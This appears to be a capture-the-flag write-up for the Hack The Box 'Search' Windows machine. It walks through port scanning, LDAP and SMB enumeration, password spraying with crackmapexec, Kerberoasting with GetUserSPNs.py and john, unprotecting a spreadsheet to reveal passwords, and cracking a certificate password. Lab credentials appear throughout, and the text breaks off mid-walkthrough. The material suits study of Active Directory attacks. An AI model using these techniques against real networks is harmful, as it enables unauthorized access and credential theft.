---
layout: default
title : muzec - Search HTB Writeup
---

![image](https://user-images.githubusercontent.com/69868171/154469155-acb39121-1585-4132-b62c-a76e65b9df94.png)

Now some little information about the target we are dealing with bruh relax man i know it hard but guess what it fun at the end it just all about trying harder and get stuck and unstuck XD.

![image](https://user-images.githubusercontent.com/69868171/154469853-c54d464d-5b74-4a5e-ae6c-bb480b672328.png)

Now since you know it windows and it rated Hard let jump in already so the hunt begin.


We always start with an nmap scan.....

```
nmap -p- --min-rate 10000 -oA nmap/allports -v IP
```


```
# Nmap 7.91 scan initiated Tue Feb  8 07:33:58 2022 as: nmap -p- --min-rate 10000 -oN nmap/full.tcp -v 10.10.11.129
Nmap scan report for 10.10.11.129
Host is up (0.39s latency).
Not shown: 65520 filtered ports
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
443/tcp   open  https
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
8172/tcp  open  unknown
49676/tcp open  unknown
49699/tcp open  unknown
49712/tcp open  unknown

Read data files from: /usr/bin/../share/nmap
# Nmap done at Tue Feb  8 07:36:38 2022 -- 1 IP address (1 host up) scanned in 160.18 seconds
```

Let throw some service detection and scripts switch on it to confirm what we have running on each ports.

```
nmap -sC -sV -oN nmap/normal.tcp -p 80,53,135,139,389,443,445,464,593,636,3268,8172,49676,49712 10.10.11.129
```

```
# Nmap 7.91 scan initiated Tue Feb  8 07:38:49 2022 as: nmap -sC -sV -oN nmap/normal.tcp -p 80,53,135,139,389,443,445,464,593,636,3268,8172,49676,49712 10.10.11.129
Nmap scan report for search.htb (10.10.11.129)
Host is up (0.34s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Search &mdash; Just Testing IIS
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
|_ssl-date: 2022-02-08T09:40:08+00:00; +2h59m35s from scanner time.
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Search &mdash; Just Testing IIS
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
|_ssl-date: 2022-02-08T09:40:08+00:00; +2h59m36s from scanner time.
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
|_ssl-date: 2022-02-08T09:40:08+00:00; +2h59m36s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
|_ssl-date: 2022-02-08T09:40:10+00:00; +2h59m35s from scanner time.
8172/tcp  open  ssl/http      Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title.
| ssl-cert: Subject: commonName=WMSvc-SHA2-RESEARCH
| Not valid before: 2020-04-07T09:05:25
|_Not valid after:  2030-04-05T09:05:25
|_ssl-date: 2022-02-08T09:40:08+00:00; +2h59m36s from scanner time.
| tls-alpn: 
|_  http/1.1
49676/tcp open  msrpc         Microsoft Windows RPC
49712/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: RESEARCH; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h59m35s, deviation: 0s, median: 2h59m34s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-02-08T09:39:28
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Feb  8 07:40:35 2022 -- 1 IP address (1 host up) scanned in 105.95 seconds
```

That is a lot of ports man i know but you are panicking already XD just kidding man so we have HTTP, HTTPS, DNS, LDAP, SMB etc. Don't know about you but am checking SMB first if we have access to anonymous shares.

![image](https://user-images.githubusercontent.com/69868171/154471824-9d11a09d-dec8-494b-905b-90c5b80ca26f.png)

Now a deadend seems we need credentials to see some shares on SMB just guessing really but high hope of 90/10. Now let check what we have on LDAP use `ldapsearch`.

```
ldapsearch -x -h 10.10.11.129 -x -s base namingcontexts
```

![image](https://user-images.githubusercontent.com/69868171/154472263-9ccf5861-3df2-4872-aca6-fa726e6749f8.png)

```
ldapsearch -x -h 10.10.11.129 -b 'DC=search,DC=htb'
```

![image](https://user-images.githubusercontent.com/69868171/154472408-6ab1b99a-9524-4f85-9d09-72dc88dab337.png)

Ahhhh nothing let check what we have running on HTTP.

![image](https://user-images.githubusercontent.com/69868171/154472806-78e2ad60-8767-4ead-a4aa-5cd346259666.png)

Seems like a normal static page but guess what we found the domain we can easily add it to `/etc/hosts` file using `echo "10.10.11.129  search.htb" >> /etc/hosts` now we are good let burst some directories using gobuster.

```
/index.html           (Status: 200) [Size: 44982]
/images               (Status: 301) [Size: 148] [--> http://search.htb/images/]
/main.html            (Status: 200) [Size: 931]
/Images               (Status: 301) [Size: 148] [--> http://search.htb/Images/]
/staff                (Status: 403) [Size: 1233]
/css                  (Status: 301) [Size: 145] [--> http://search.htb/css/]
/Index.html           (Status: 200) [Size: 44982]
/js                   (Status: 301) [Size: 144] [--> http://search.htb/js/]
/Main.html            (Status: 200) [Size: 931]
/Staff                (Status: 403) [Size: 1233]
/fonts                (Status: 301) [Size: 147] [--> http://search.htb/fonts/]
/IMAGES               (Status: 301) [Size: 148] [--> http://search.htb/IMAGES/]
/INDEX.html           (Status: 200) [Size: 44982]
/Fonts                (Status: 301) [Size: 147] [--> http://search.htb/Fonts/]
/single.html          (Status: 200) [Size: 19559]
/*checkout*           (Status: 400) [Size: 3420]
```

Found only the staff directory but when i try to access it i got access denied.

![image](https://user-images.githubusercontent.com/69868171/154473422-40feda86-607c-4845-a742-8145570e3b50.png)

Now back to the homepage to check if we finish anything.

![image](https://user-images.githubusercontent.com/69868171/154473560-1363d133-5cc4-4ecd-9144-722884c41a67.png)

But seems so we missing a slide that is having a scheduled activties let zoom it out.

![image](https://user-images.githubusercontent.com/69868171/154473874-75311146-bef3-4545-af65-234a7b9f496f.png)

Seems am right a username and a password i guess.

```
Name: Hope Sharp
Password: IsolationIsKey?
```

But it just a name not like a username but not to worry we can use BridgeKeeper to generate usernames from the name we have or doing it manually also.


![image](https://user-images.githubusercontent.com/69868171/154476637-c957f7c5-d76d-4721-9a20-4e026f7d75f4.png)

Now let feed it to `crackmapexec` .

```
┌──(muzec㉿Muzec-Security)-[~/Documents/HTB/10.10.11.129]
└─$ crackmapexec smb search.htb -u usersnames.txt -p 'IsolationIsKey?' --continue-on-success
SMB         10.10.11.129    445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.129    445    RESEARCH         [+] search.htb\hope.sharp:IsolationIsKey? 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\hsharp:IsolationIsKey? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\hopes:IsolationIsKey? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\h.sharp:IsolationIsKey? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\hope.s:IsolationIsKey? STATUS_LOGON_FAILURE 
                                                                                                                                                                       
┌──(muzec㉿Muzec-Security)-[~/Documents/HTB/10.10.11.129]
```

Boom we found the username now let access some SMB shares.

![image](https://user-images.githubusercontent.com/69868171/154477647-4f20b04d-8f60-4346-8319-897d774856da.png)

Now we have some shares to enumerate let go through it.

![image](https://user-images.githubusercontent.com/69868171/154478129-9078d57d-b309-4873-b96c-736b81aad8ad.png)

Boom more users going through the shares got nothing but seems we have a valid credentials let me break it down.

![image](https://user-images.githubusercontent.com/69868171/154478862-b081ccda-3ee3-4f79-9ded-2cda7847ed4b.png)


If you compromise a user that has a valid kerberos ticket-granting ticket (TGT), then you can request one or more ticket-granting service (TGS) service tickets for any Service Principal Name (SPN) from a domain controller. An example SPN would be the Application Server shown in the above figure.

A portion of the TGS ticket is encrypted with the hash of the service account associated with the SPN. Therefore, you can run an offline brute force attack on the encrypted portion to reveal the service account password. Therefore, if you request an administrator account TGS ticket and the administrator is using a weak password, we’ll be able to crack it!

```
┌──(muzec㉿Muzec-Security)-[~/Documents/HTB/10.10.11.129]
└─$ GetUserSPNs.py search.htb/hope.sharp:'IsolationIsKey?' -dc-ip 10.10.11.129 -request
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

ServicePrincipalName               Name     MemberOf  PasswordLastSet             LastLogon  Delegation 
---------------------------------  -------  --------  --------------------------  ---------  ----------
RESEARCH/web_svc.search.htb:60001  web_svc            2020-04-09 13:59:11.329031  <never>               



[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

If you find this error from Linux: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great) it because of your local time, you need to synchronise the host with the DC: `ntpdate IP of DC` .

![image](https://user-images.githubusercontent.com/69868171/154479501-ec0730fe-34f3-4bdc-8d35-36a54879278b.png)

Boom We were able to request a TGS ticket containing a hash for 	web_svc	 user let try and crack the hash using john the ripper.

```
┌──(muzec㉿Muzec-Security)-[~/Documents/HTB/10.10.11.129]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt                                   
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
No password hashes left to crack (see FAQ)
                                                                                                                                                                       
┌──(muzec㉿Muzec-Security)-[~/Documents/HTB/10.10.11.129]
└─$ john --show hash.txt                                     
?:@3ONEmillionbaby

1 password hash cracked, 0 left
                                                                                                                                                                       
┌──(muzec㉿Muzec-Security)-[~/Documents/HTB/10.10.11.129]
```

Now that we have a password let try password reuses on the usernames we have yes i mean spraying it with `crackmapexec` maybe any user is using the same password.

![image](https://user-images.githubusercontent.com/69868171/154483520-520a0e00-8417-4710-afb8-74142519c09c.png)

Now let hit it with crackmapexec.

```
┌──(muzec㉿Muzec-Security)-[~/Documents/HTB/10.10.11.129]
└─$ crackmapexec smb search.htb -u users.txt -p @3ONEmillionbaby --continue-on-success
```
![image](https://user-images.githubusercontent.com/69868171/154484719-063fc420-1434-479a-a53f-aded1c670cfe.png)

Now we can use it to access SMB.

![image](https://user-images.githubusercontent.com/69868171/154484918-8c9346d7-38cf-455e-8ef4-d8ff05ba3a81.png)

Now let see what we can get in the SMB shares of user `edgar.jacobs` .

![image](https://user-images.githubusercontent.com/69868171/154485146-0ae60ca4-0b0e-459d-9084-ef23fa443dda.png)

Boom we have a `xlsx` file let download it to our target. But when i opened the file which contains firstname, lastname, Username. There is also a protected cell named password which is hided let see how we can recovered that.

Let go through some few tricks which we can use to recover a protected cell.

let make a copy of the document rename the file from `Phishing_Attempt.xlsx` to `Phishing_Attempt.zip` after that let unzip it and we should have a folder.

![image](https://user-images.githubusercontent.com/69868171/154487867-4085ca68-1090-4f0a-85dd-5a7ad9b270f8.png)

Now let locate the `xl` folder and then `worksheets` inside the `worksheets` now let open the `sheet2.xml` file.

![image](https://user-images.githubusercontent.com/69868171/154487928-74773c6b-2e37-4fcd-9f03-1828a1fe4ff5.png)

![image](https://user-images.githubusercontent.com/69868171/154488355-86375b7f-22f5-4dab-8d61-02b90b510586.png)

![image](https://user-images.githubusercontent.com/69868171/154488423-7ec930c1-e44d-46b4-958b-c48c76d24b55.png)

![image](https://user-images.githubusercontent.com/69868171/154488816-86435256-ecd4-450b-a1d9-e30a5ecdec86.png)

Now let remove the `sheetProtection` tag and save file back.

Renaming the file `Phishing_Attempt.zip` back to `Phishing_Attempt.xlsx` and when you Open the file you should now be able to read the password cell.

![image](https://user-images.githubusercontent.com/69868171/154489205-0932575f-5157-4917-8e97-6dbeab4f4614.png)

A quick Notice:- `I was able to perform this process by using a Windows machine linux keep bringing gibberish.`

Now that we have more credentials let spray it again on SMB using `crackmapexec` XD .

```
┌──(muzec㉿Muzec-Security)-[~/Documents/HTB/10.10.11.129]
└─$ crackmapexec smb search.htb -u users.txt -p pass.txt --continue-on-success       
```

![image](https://user-images.githubusercontent.com/69868171/154490636-426d705f-6183-42cc-b593-f754d9d4e876.png)

Ahhh yes let use it to access the SMB share again to see what we can get in `sierra.frye` desktop.

![image](https://user-images.githubusercontent.com/69868171/154490907-94ce1e62-9c01-44bd-a02a-05fe6ca2315b.png)

Now that we are in let check `sierra.frye` desktop.

![image](https://user-images.githubusercontent.com/69868171/154491493-f4aa5831-4217-491f-88d2-f2b8ffa449c7.png)

Boom we have `user.txt` finally going throug the rest dirs we found a backups folder which contains certificate files. After some time doing research, I found out this certificate can be imported into the browser and used by some domains. Trying to import the certificate requires a password. I used [crackpkcs12](https://github.com/crackpkcs12/crackpkcs12) to crack the password and imported the certificate successfully.

```
┌──(muzec㉿Muzec-Security)-[~/Documents/HTB/10.10.11.129]
└─$ crackpkcs12 -d  /usr/share/wordlists/rockyou.txt staff.pfx -t 10 
```
